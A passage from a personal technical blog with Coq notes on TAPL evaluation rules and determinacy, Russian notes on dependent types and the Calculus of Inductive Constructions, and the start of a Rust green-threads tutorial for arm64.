</span></span><span style="display:flex;"><span><span style="color:#728e00">|</span> <span style="color:#434f54">E_IfFalse</span> <span style="color:#728e00">:</span> <span style="color:#728e00">forall</span> <span style="color:#434f54">t1</span> <span style="color:#434f54">t2</span><span style="color:#728e00">,</span> <span style="color:#728e00">[</span> <span style="color:#728e00">if</span> <span style="color:#434f54">false</span> <span style="color:#728e00">then</span> <span style="color:#434f54">t1</span> <span style="color:#728e00">else</span> <span style="color:#434f54">t2</span> <span style="color:#728e00">]</span> <span style="color:#728e00">==&gt;</span> <span style="color:#434f54">t2</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">|</span> <span style="color:#434f54">E_If</span> <span style="color:#728e00">:</span> <span style="color:#728e00">forall</span> <span style="color:#434f54">c</span> <span style="color:#434f54">c&#39;</span> <span style="color:#434f54">t1</span> <span style="color:#434f54">t2</span><span style="color:#728e00">,</span> <span style="color:#434f54">c</span> <span style="color:#728e00">==&gt;</span> <span style="color:#434f54">c&#39;</span> <span style="color:#728e00">-&gt;</span> <span style="color:#728e00">[</span> <span style="color:#728e00">if</span> <span style="color:#434f54">c</span> <span style="color:#728e00">then</span> <span style="color:#434f54">t1</span> <span style="color:#728e00">else</span> <span style="color:#434f54">t2</span><span style="color:#728e00">]</span> <span style="color:#728e00">==&gt;</span> <span style="color:#728e00">[</span> <span style="color:#728e00">if</span> <span style="color:#434f54">c&#39;</span> <span style="color:#728e00">then</span> <span style="color:#434f54">t1</span> <span style="color:#728e00">else</span> <span style="color:#434f54">t2</span> <span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span><span style="color:#434f54">where</span> <span style="color:#7f8c8d">&#34;e ==&gt; e&#39;&#34;</span> <span style="color:#728e00">:=</span> <span style="color:#728e00">(</span><span style="color:#434f54">eval_step</span> <span style="color:#434f54">e</span> <span style="color:#434f54">e&#39;</span><span style="color:#728e00">).</span>
</span></span></code></pre></div><p><strong>Definition</strong>: an instance of an inference rule is obtained by
consistently replace each metavariable by the same term in the
rule&rsquo;s conclusion and all its premises (if any).</p>
<p>The example instance of the <code>E_IfTrue</code> rule:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-coq" data-lang="coq"><span style="display:flex;"><span><span style="color:#728e00">Theorem</span> <span style="color:#434f54">ex_inst_e_iftrue</span> <span style="color:#728e00">:</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">[</span> <span style="color:#728e00">if</span> <span style="color:#434f54">true</span> <span style="color:#728e00">then</span> <span style="color:#434f54">true</span> <span style="color:#728e00">else</span> <span style="color:#728e00">(</span><span style="color:#728e00">if</span> <span style="color:#434f54">false</span> <span style="color:#728e00">then</span> <span style="color:#434f54">false</span> <span style="color:#728e00">else</span> <span style="color:#434f54">false</span><span style="color:#728e00">)</span> <span style="color:#728e00">]</span> <span style="color:#728e00">==&gt;</span> <span style="color:#728e00">[</span> <span style="color:#434f54">true</span> <span style="color:#728e00">].</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">Proof</span><span style="color:#728e00">.</span> <span style="color:#00979d">by</span> <span style="color:#728e00">apply</span><span style="color:#728e00">:</span> <span style="color:#434f54">E_IfTrue</span><span style="color:#728e00">.</span> <span style="color:#728e00">Qed</span><span style="color:#728e00">.</span>
</span></span></code></pre></div><p><strong>Definition</strong>: The one-step evaluation relation <code>==&gt;</code> is the
smallest binary relation on terms satisfying the three rules in
<code>eval_step</code>. When the pair <code>(t, t')</code> is in the evaluation
relation, we say that &ldquo;the evaluation statement (or judgment) <code>t ==&gt; t'</code> is derivable&rdquo;.</p>
<p>Let&rsquo;s show an example of a derivable evaluation statememt. We&rsquo;ll
use these 3 abbreviations (they are taken from the book as is):</p>
<p>The proof is by construction of a derivation &ldquo;tree&rdquo;:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-coq" data-lang="coq"><span style="display:flex;"><span><span style="color:#728e00">Module</span> <span style="color:#434f54">Ex_3_5_3</span><span style="color:#728e00">.</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">Definition</span> <span style="color:#434f54">s</span> <span style="color:#728e00">:=</span> <span style="color:#728e00">[</span> <span style="color:#728e00">if</span> <span style="color:#434f54">true</span>  <span style="color:#728e00">then</span> <span style="color:#434f54">false</span> <span style="color:#728e00">else</span> <span style="color:#434f54">false</span> <span style="color:#728e00">].</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">Definition</span> <span style="color:#434f54">t</span> <span style="color:#728e00">:=</span> <span style="color:#728e00">[</span> <span style="color:#728e00">if</span> <span style="color:#434f54">s</span>     <span style="color:#728e00">then</span> <span style="color:#434f54">true</span>  <span style="color:#728e00">else</span> <span style="color:#434f54">true</span>  <span style="color:#728e00">].</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">Definition</span> <span style="color:#434f54">u</span> <span style="color:#728e00">:=</span> <span style="color:#728e00">[</span> <span style="color:#728e00">if</span> <span style="color:#434f54">false</span> <span style="color:#728e00">then</span> <span style="color:#434f54">true</span>  <span style="color:#728e00">else</span> <span style="color:#434f54">true</span>  <span style="color:#728e00">].</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">Theorem</span> <span style="color:#434f54">ex</span> <span style="color:#728e00">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">[</span> <span style="color:#728e00">if</span> <span style="color:#434f54">t</span> <span style="color:#728e00">then</span> <span style="color:#434f54">false</span> <span style="color:#728e00">else</span> <span style="color:#434f54">false</span> <span style="color:#728e00">]</span> <span style="color:#728e00">==&gt;</span> <span style="color:#728e00">[</span> <span style="color:#728e00">if</span> <span style="color:#434f54">u</span> <span style="color:#728e00">then</span> <span style="color:#434f54">false</span> <span style="color:#728e00">else</span> <span style="color:#434f54">false</span> <span style="color:#728e00">].</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">Proof</span><span style="color:#728e00">.</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">apply</span><span style="color:#728e00">:</span> <span style="color:#434f54">E_If</span><span style="color:#728e00">.</span>
</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">(*                             t ==&gt; u
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6">       [ if s then true else true  ] ==&gt; [ if false then true else true  ] *)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">apply</span><span style="color:#728e00">:</span> <span style="color:#434f54">E_If</span><span style="color:#728e00">.</span>
</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">(*                                 s ==&gt; [ false ]
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6">       [ if true then false else false ] ==&gt; [ false ] *)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">exact</span><span style="color:#728e00">:</span> <span style="color:#434f54">E_IfTrue</span><span style="color:#728e00">.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">Restart</span><span style="color:#728e00">.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">by</span> <span style="color:#00979d">do</span> <span style="color:#434f54">2</span><span style="color:#728e00">!</span> <span style="color:#728e00">apply</span><span style="color:#728e00">:</span> <span style="color:#434f54">E_If</span><span style="color:#728e00">;</span> <span style="color:#00979d">exact</span><span style="color:#728e00">:</span> <span style="color:#434f54">E_IfTrue</span><span style="color:#728e00">.</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">Qed</span><span style="color:#728e00">.</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">End</span> <span style="color:#434f54">Ex_3_5_3</span><span style="color:#728e00">.</span>
</span></span></code></pre></div><p><strong>Theorem</strong> [Determinacy of one-step evaluation]:
if <code>t ==&gt; t'</code> and <code>t ==&gt; t''</code>, then <code>t' = t''</code>.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-coq" data-lang="coq"><span style="display:flex;"><span><span style="color:#728e00">Theorem</span> <span style="color:#434f54">eval_step_is_det</span> <span style="color:#728e00">:</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">forall</span> <span style="color:#434f54">t</span> <span style="color:#434f54">t&#39;</span> <span style="color:#434f54">t&#39;&#39;</span> <span style="color:#728e00">:</span> <span style="color:#434f54">term</span><span style="color:#728e00">,</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">(</span><span style="color:#434f54">t</span> <span style="color:#728e00">==&gt;</span> <span style="color:#434f54">t&#39;</span><span style="color:#728e00">)</span> <span style="color:#728e00">/\</span> <span style="color:#728e00">(</span><span style="color:#434f54">t</span> <span style="color:#728e00">==&gt;</span> <span style="color:#434f54">t&#39;&#39;</span><span style="color:#728e00">)</span> <span style="color:#728e00">-&gt;</span> <span style="color:#434f54">t&#39;</span> <span style="color:#728e00">=</span> <span style="color:#434f54">t&#39;&#39;</span><span style="color:#728e00">.</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">Proof</span><span style="color:#728e00">.</span>
</span></span><span style="display:flex;"><span>  <span style="color:#95a5a6">(* I haven’t came up with a proof yet *)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">Abort</span><span style="color:#728e00">.</span>
</span></span></code></pre></div><p>It would be much easier to define the one-step evaluation as a
function instead:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-coq" data-lang="coq"><span style="display:flex;"><span><span style="color:#728e00">Fixpoint</span> <span style="color:#434f54">one_step</span> <span style="color:#728e00">(</span><span style="color:#434f54">t</span> <span style="color:#728e00">:</span> <span style="color:#434f54">term</span><span style="color:#728e00">)</span> <span style="color:#728e00">:</span> <span style="color:#434f54">term</span> <span style="color:#728e00">:=</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">match</span> <span style="color:#434f54">t</span> <span style="color:#728e00">with</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">|</span> <span style="color:#434f54">T_cond</span> <span style="color:#434f54">T_true</span> <span style="color:#434f54">t1</span> <span style="color:#434f54">t2</span> <span style="color:#728e00">=&gt;</span> <span style="color:#434f54">t1</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">|</span> <span style="color:#434f54">T_cond</span> <span style="color:#434f54">T_false</span> <span style="color:#434f54">t1</span> <span style="color:#434f54">t2</span> <span style="color:#728e00">=&gt;</span> <span style="color:#434f54">t2</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">|</span> <span style="color:#434f54">T_cond</span> <span style="color:#434f54">cond</span> <span style="color:#434f54">t1</span> <span style="color:#434f54">t2</span> <span style="color:#728e00">=&gt;</span> <span style="color:#434f54">T_cond</span> <span style="color:#728e00">(</span><span style="color:#434f54">one_step</span> <span style="color:#434f54">cond</span><span style="color:#728e00">)</span> <span style="color:#434f54">t1</span> <span style="color:#434f54">t2</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">|</span> <span style="color:#434f54">t</span> <span style="color:#728e00">=&gt;</span> <span style="color:#434f54">t</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">end</span><span style="color:#728e00">.</span>
</span></span></code></pre></div><p>A separate notation for our fixpoint-definition:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-coq" data-lang="coq"><span style="display:flex;"><span><span style="color:#728e00">Notation</span> <span style="color:#7f8c8d">&#34;t ==&gt;&gt; t&#39;&#34;</span> <span style="color:#728e00">:=</span> <span style="color:#728e00">(</span><span style="color:#434f54">one_step</span> <span style="color:#434f54">t</span> <span style="color:#728e00">=</span> <span style="color:#434f54">t&#39;</span><span style="color:#728e00">)</span> <span style="color:#728e00">(</span><span style="color:#434f54">at</span> <span style="color:#434f54">level</span> <span style="color:#434f54">50</span><span style="color:#728e00">).</span>
</span></span></code></pre></div><p>Now, it is much simplier to proove it:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-coq" data-lang="coq"><span style="display:flex;"><span><span style="color:#728e00">Theorem</span> <span style="color:#434f54">one_step_is_det</span> <span style="color:#434f54">t</span> <span style="color:#434f54">t&#39;</span> <span style="color:#434f54">t&#39;&#39;</span><span style="color:#728e00">:</span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">t</span> <span style="color:#728e00">==&gt;&gt;</span> <span style="color:#434f54">t&#39;</span> <span style="color:#728e00">/\</span> <span style="color:#434f54">t</span> <span style="color:#728e00">==&gt;&gt;</span> <span style="color:#434f54">t&#39;&#39;</span> <span style="color:#728e00">-&gt;</span> <span style="color:#434f54">t&#39;</span> <span style="color:#728e00">=</span> <span style="color:#434f54">t&#39;&#39;</span><span style="color:#728e00">.</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">Proof</span><span style="color:#728e00">.</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">move</span><span style="color:#728e00">=&gt;</span> <span style="color:#434f54">[]</span> <span style="color:#434f54">H1</span> <span style="color:#434f54">H2</span><span style="color:#728e00">.</span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">rewrite</span> <span style="color:#728e00">-</span><span style="color:#434f54">H1</span> <span style="color:#728e00">-</span><span style="color:#434f54">H2</span><span style="color:#728e00">.</span>
</span></span><span style="display:flex;"><span>  <span style="color:#00979d">done</span><span style="color:#728e00">.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">Restart</span><span style="color:#728e00">.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#95a5a6">(* Idiomatic proof *)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#00979d">by</span> <span style="color:#728e00">move</span><span style="color:#728e00">=&gt;</span> <span style="color:#434f54">[]</span> <span style="color:#728e00">-&gt;.</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">Qed</span><span style="color:#728e00">.</span>
</span></span></code></pre></div><p>Let’s define a notion of the “normal form”.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-coq" data-lang="coq"><span style="display:flex;"><span><span style="color:#728e00">Definition</span> <span style="color:#434f54">nf</span> <span style="color:#434f54">t</span> <span style="color:#728e00">:=</span> <span style="color:#434f54">t</span> <span style="color:#728e00">==&gt;&gt;</span> <span style="color:#434f54">t</span><span style="color:#728e00">.</span>
</span></span></code></pre></div><p><strong>Theorem 3.5.7</strong>: Every value is in normal form.</p>
<p>The proof is trivial:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-coq" data-lang="coq"><span style="display:flex;"><span><span style="color:#728e00">Theorem</span> <span style="color:#434f54">vnf</span> <span style="color:#728e00">:</span> <span style="color:#434f54">nf</span> <span style="color:#728e00">[[</span> <span style="color:#434f54">true</span> <span style="color:#728e00">]]</span> <span style="color:#728e00">/\</span> <span style="color:#434f54">nf</span> <span style="color:#728e00">[[</span> <span style="color:#434f54">false</span> <span style="color:#728e00">]].</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">Proof</span><span style="color:#728e00">.</span> <span style="color:#00979d">by</span> <span style="color:#434f54">[]</span><span style="color:#728e00">.</span> <span style="color:#728e00">Qed</span><span style="color:#728e00">.</span>
</span></span></code></pre></div><p><strong>Theorem 3.5.8</strong>: If <code>t</code> is in normal form, then <code>t</code> is a value.</p>
<!--list-separator-->
<ul>
<li>
<p>Summary</p>
<p>TODO</p>
</li>
</ul>
<h4 id="proving-tapl-in-coq-ch-4">
  <span class="org-todo todo TODO">TODO</span> Proving TAPL in Coq (ch 4, WIP)
  <a class="heading-link" href="#proving-tapl-in-coq-ch-4">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-coq" data-lang="coq"><span style="display:flex;"><span><span style="color:#728e00">Inductive</span> <span style="color:#434f54">term</span> <span style="color:#728e00">:</span> <span style="color:#00979d">Type</span> <span style="color:#728e00">:=</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">|</span> <span style="color:#434f54">term_true</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">|</span> <span style="color:#434f54">term_false</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">|</span> <span style="color:#434f54">term_cond</span> <span style="color:#728e00">(</span><span style="color:#434f54">cond</span> <span style="color:#434f54">t1</span> <span style="color:#434f54">t2</span> <span style="color:#728e00">:</span> <span style="color:#434f54">term</span><span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">|</span> <span style="color:#434f54">term_zero</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">|</span> <span style="color:#434f54">term_succ</span> <span style="color:#728e00">(</span><span style="color:#434f54">n</span> <span style="color:#728e00">:</span> <span style="color:#434f54">term</span><span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">|</span> <span style="color:#434f54">term_pred</span> <span style="color:#728e00">(</span><span style="color:#434f54">n</span> <span style="color:#728e00">:</span> <span style="color:#434f54">term</span><span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">|</span> <span style="color:#434f54">term_iszero</span> <span style="color:#728e00">(</span><span style="color:#434f54">n</span> <span style="color:#728e00">:</span> <span style="color:#434f54">term</span><span style="color:#728e00">).</span>
</span></span></code></pre></div><h3 id="notes-on-types-in-coq.ru-ru">
  <span class="org-todo done DONE">DONE</span> Заметки про типы в Coq (WIP)
  <a class="heading-link" href="#notes-on-types-in-coq.ru-ru">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<h4 id="gallina-и-cic">
  Gallina и CIC
  <a class="heading-link" href="#gallina-%d0%b8-cic">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<p>Формальный язык, который используется в Coq для описания
математических утверждений и доказательств называется курица
(Gallina это “курица“ в переводе с испанского на русский). Этот
язык основан на формализме (разновидности теории типов), который
называется Исчисление Индуктивных Конструкций (Calculus of
Inductive Constructions, сокращённо CIC).</p>
<p>Логические утверждения отождествляются с некоторыми типами, а их
доказательства с термами соответствующих типов. Таким образом,
чтобы доказать утверждение необходимо сконструировать
(предъявить) терм нужного типа. Короче говоря: утверждения это
типы, а программы это доказательства. Кстати, в обратную сторону
это не всегда работает.</p>
<p>Каждое выражение в Gallina это терм CIC, а любой терм имеет тип
(в некотором контексте).</p>
<h4 id="зависимые-типы-и-функции">
  Зависимые типы и функции
  <a class="heading-link" href="#%d0%b7%d0%b0%d0%b2%d0%b8%d1%81%d0%b8%d0%bc%d1%8b%d0%b5-%d1%82%d0%b8%d0%bf%d1%8b-%d0%b8-%d1%84%d1%83%d0%bd%d0%ba%d1%86%d0%b8%d0%b8">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<p><em>Рекомендую предварительно получить какое-то представление или
освежить знания о зависимых типах. Достаточно потратить 5 минут на чтение <a href="https://ru.wikipedia.org/wiki/%D0%97%D0%B0%D0%B2%D0%B8%D1%81%D0%B8%D0%BC%D1%8B%D0%B9_%D1%82%D0%B8%D0%BF"  class="external-link" target="_blank" rel="noopener">русской вики</a></em></p>
<p><strong>Тип</strong> это частный случай терма, определямый с помощью
утверждения типизации.</p>
<p>Если \( x \) – переменная, а \( T \) и \( U \) – термы, тогда \(
\forall x : T, U \) тоже терм. В то же время это тип, который представляет
собой семейство типов \( U \), индексированных элементами типа
\( T \).</p>
<ul>
<li>Когда \( x \) встречается в терме \( U \) (как свободная
переменная) мы говорим, что \( \forall x : T, U \) – зависимый тип</li>
<li>Если \( x \) не используется в \( U \), то мы получим обычную
ф-цию типа \( T \rightarrow U \)</li>
</ul>
<p>Нет никакой разницы между \( A \rightarrow B \) и \( \forall x : A, B \) (кроме
нотации).</p>
<p>В Coq нотация вида <code>&quot;A -&gt; B&quot; := forall _ : A, B</code> это зависимая
ф-ция, в том случае, когда возвращаемый тип никак не зависит от
входного значения.</p>
<p>Вообще говоря, обычное функциональное пространство является тем
частным случаем, когда область значений не зависит от входного
параметра.</p>
<h4 id="типы-термы-и-вычисления">
  Типы, термы и вычисления
  <a class="heading-link" href="#%d1%82%d0%b8%d0%bf%d1%8b-%d1%82%d0%b5%d1%80%d0%bc%d1%8b-%d0%b8-%d0%b2%d1%8b%d1%87%d0%b8%d1%81%d0%bb%d0%b5%d0%bd%d0%b8%d1%8f">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<p>Простейшие термы это переменные и два сорта: \( Prop \) и \(
Type_{i} \) для \( i \in \mathbb{N} \).</p>
<p>Как известно, <a href="https://ru.wikipedia.org/wiki/%D0%9F%D1%80%D0%BE%D1%81%D1%82%D0%BE_%D1%82%D0%B8%D0%BF%D0%B8%D0%B7%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D0%BD%D0%BD%D0%BE%D0%B5_%D0%BB%D1%8F%D0%BC%D0%B1%D0%B4%D0%B0-%D0%B8%D1%81%D1%87%D0%B8%D1%81%D0%BB%D0%B5%D0%BD%D0%B8%D0%B5#%D0%9A%D0%BE%D0%BD%D1%82%D0%B5%D0%BA%D1%81%D1%82%D1%8B_%D1%82%D0%B8%D0%BF%D0%B8%D0%B7%D0%B0%D1%86%D0%B8%D0%B8_%D0%B8_%D1%83%D1%82%D0%B2%D0%B5%D1%80%D0%B6%D0%B4%D0%B5%D0%BD%D0%B8%D1%8F_%D1%82%D0%B8%D0%BF%D0%B8%D0%B7%D0%B0%D1%86%D0%B8%D0%B8"  class="external-link" target="_blank" rel="noopener">утверждения типизации</a> вроде \( \Gamma \vdash t : T
\) связывают некоторый контекст \( \Gamma \) (гамма) и два терма \( t
\) и \( T \). Контекст \( \Gamma \) это такое место, где хранятся все
известные нам факты и предположения в тот момент, когда нам
встречается терм, который мы видим справа от \( \vdash \).
Контекст может быть пустым или содержать типизированные
переменные и определения:</p>
<ul>
<li>Типизированная <strong>переменная</strong> – пара из имени и типа:
<code>Variable n : nat</code></li>
<li>Типизированное <strong>определение</strong> – тройка из имени, терма и
типа: <code>Definition a : T := t</code></li>
</ul>
<p>Утверждения типизации в пустом контексте выражают аксиомы:</p>
<ul>
<li>\( \vdash Prop : Type_{1} \)</li>
<li>\( \vdash Type : Type_{i+1} \)</li>
</ul>
<p>Т.е. сорта \( Prop \) и \( Type \) это одновременно и типы и типы типов.</p>
<p>Тип это терм, который может  быть типизирован сортом в некотором контексте:</p>
<ul>
<li>\( \Gamma \vdash T : Prop \)</li>
<li>\( \Gamma \vdash T : Type \)</li>
</ul>
<p>Контексты позволяют нам конструировать более сложные типы, например:</p>
<p>\( \Gamma \vdash T : Type \wedge \Gamma,x : T \vdash U : Type \Longrightarrow \Gamma \vdash \forall x : T, U : Type \)</p>
<p>полученный тип \( \Gamma \vdash \forall x : T, U : Type \) это тип функций \( T \rightarrow U \),
которые описываются следующим правилом:
\( \Gamma \vdash \forall x : T, U : Type \wedge \Gamma,x : T \vdash t : U
\Longrightarrow \Gamma \vdash fun \space x \Rightarrow t : \forall x : T, U \)</p>
<p>Применение можно типизировать так:
\( \Gamma \vdash u : \forall x : T, U \wedge \Gamma \vdash t : T \Longrightarrow \Gamma
\vdash u \space t : U [t/x] \)</p>
<p>где \( U [t/x] \) это тип, полученный путём замены переменной
\( x \) на терм \( t \) в \( U \).</p>
<p>Рассмотрим тавтолгию \( A \rightarrow A \). Здесь символ импликации \( \rightarrow
\) можно понимать как логическую импликацию (“если…, то…”), но
этот же символ мы используем и для функций.</p>
<p>Терм <code>fun x : A =&gt; x</code> это единичная функция для термов типа \( A
\) и программа типа \( A \rightarrow A \).</p>
<p>Если понимать тип \( A \) как утверждение, а термы этого типа
как доказательства (свидетельства) этого утверждения, то
вышеупомянутая функция это единичиная функция над
доказательствами \( A \).</p>
<p>Вообще, доказательства импликаций можно рассматривать как
функции, трансформирующие доказательства предпосылок в
доказательства заключений.</p>
<p>Рассмотрим правила ввода для импликации и универсальной
квантификации. Следующая запись означает: для того, чтобы
доказать \( A \rightarrow B \) нам нужно доказать \( B \), при условии,
что \( A \) уже доказано.</p>
<p>\( {\dfrac{{A \atop \vdots} \atop B}{A \rightarrow B}} \rightarrow I \)</p>
<p>Аналогично и здесь: чтобы доказать \( \forall x, B \) мы должны
доказать \( B \) для некоторой переменной \( x \).</p>
<p>\( {\dfrac{B}{\forall x, B}}{\space \forall_{I} \space (x \space \textsf{fresh})} \)</p>
<p>Аннотируем эти правила типизации термами, имеющими
соответствующие типы:</p>
<p>\( {\dfrac{{x \space : \space A \atop \vdots} \atop {b \space : \space B}}{(fun \space x : A
\Rightarrow b) : A \rightarrow B}} \rightarrow I \)</p>
<p>\( \dfrac{b : B}{(fun \space x : A \Rightarrow b) : \forall x, B} \space \forall_{I} \)</p>
<p>Заметим, что терм (абстракция) \( fun … \Rightarrow … \) служит
доказательством для обоих правил. И в том и в другом случае терм
\( b \) является доказательством \( B \). Единственная разница в
том, что \( x \) может быть свободной переменной в \( B \)
только во втором правиле.</p>
<p>Сделаем тоже самое для соответствующий правил
элиминации\удаления. Имеем следующие правила:</p>
<p>\( \dfrac{A \rightarrow B \qquad A}{B} \rightarrow E \)</p>
<p>\( \dfrac{\forall x, B}{B[t/x]} \space \forall_E \space (t \space \textsf{is a term})\)</p>
<p>Как видно из аннотированных правил ниже, в случае элиминации
доказательством становится применение функции.</p>
<p>\( \dfrac{f : A \rightarrow B \qquad t : A}{(f \space t) : B} \rightarrow E \)</p>
<p>\( \dfrac{f : \forall x : A, B \qquad t : A}{(f \space t) : B[t/x]} \space \forall_E \)</p>
<p>Для более глубокого погружения можно почитать вышеупомянутую
книгу и <a href="https://hal.inria.fr/hal-01094195/document"  class="external-link" target="_blank" rel="noopener">Introduction to the Calculus of Inductive Constructions</a>.</p>
<h2 id="rust">
  Rust <span class="tag"><span class="_rust">@rust</span><span class="rust">rust</span></span>
  <a class="heading-link" href="#rust">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<h3 id="exploring-async-basics.ru-ru">
  <span class="org-todo done DONE">DONE</span> Зелёные потоки в 200 строчек на Rust. Часть 1 <span class="tag"><span class="_arm64">@arm64</span></span>
  <a class="heading-link" href="#exploring-async-basics.ru-ru">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p><em>Это вольный перевод-конспект &ldquo;книги&rdquo; <a href="https://cfsamson.gitbook.io/green-threads-explained-in-200-lines-of-rust/"  class="external-link" target="_blank" rel="noopener">Green Threads Explained in 200
Lines of Rust</a></em>.</p>
<p>Пользовательские потоки, горутины, файберы &ndash; у них много
названий, но далее для простоты мы будем называть их <strong>зелёные
потоки</strong>. Чтобы разобраться как они устроены мы напишем
игрушечную реализацию.</p>
<p>Итак, как мы знаем, есть два вида многозадачности:</p>
<ul>
<li><strong>Вытесняющая</strong> &ndash; внешний планировщик принимает решения о том
когда будет выполняться какой поток и отвечает за переключение
между ними. Используется в операционных системах.</li>
<li><strong>Кооперативная</strong> &ndash; поток сам решает когда нужно отдать
процессорное время другим задачам. Это имеет смысл делать при
ожидании чего-либо, например, мы часто ждём I/O. При
блокировке поток передаёт управление планировщику, который
переключается на выполнение другой задачи/потока.</li>
</ul>
<p>Нас интересует кооперативная.</p>
<p>Попробуем описать состояние CPU и стек для нашей игрушечной
реализации зелёных потоков. Поскольку я экспериментирую на
macbook c процессором M1, то будем писать ассемблер для arm64.</p>
<p>Нам понадобится макрос <code>asm!</code>:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span><span style="color:#728e00">use</span> <span style="color:#434f54">core</span>::<span style="color:#434f54">arch</span>::<span style="color:#434f54">asm</span>;
</span></span></code></pre></div><p>Размер стека выберем не более 48 байт, чтобы было удобно
смотреть на него в терминале:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span><span style="color:#728e00">const</span> <span style="color:#434f54">SSIZE</span>: <span style="color:#00979d">isize</span> <span style="color:#728e00">=</span> <span style="color:#8a7b52">48</span>;
</span></span></code></pre></div><p>Теперь добавим структуру, которая будет описывать состояние (контекст) потока.
Сейчас нам понадобится только регистр указателя на стек:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span><span style="color:#728e00">#[derive(Debug, Default)]</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">#[repr(C)]</span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">struct</span> <span style="color:#434f54">ThreadContext</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">sp</span>: <span style="color:#00979d">u64</span>,
</span></span><span style="display:flex;"><span>}
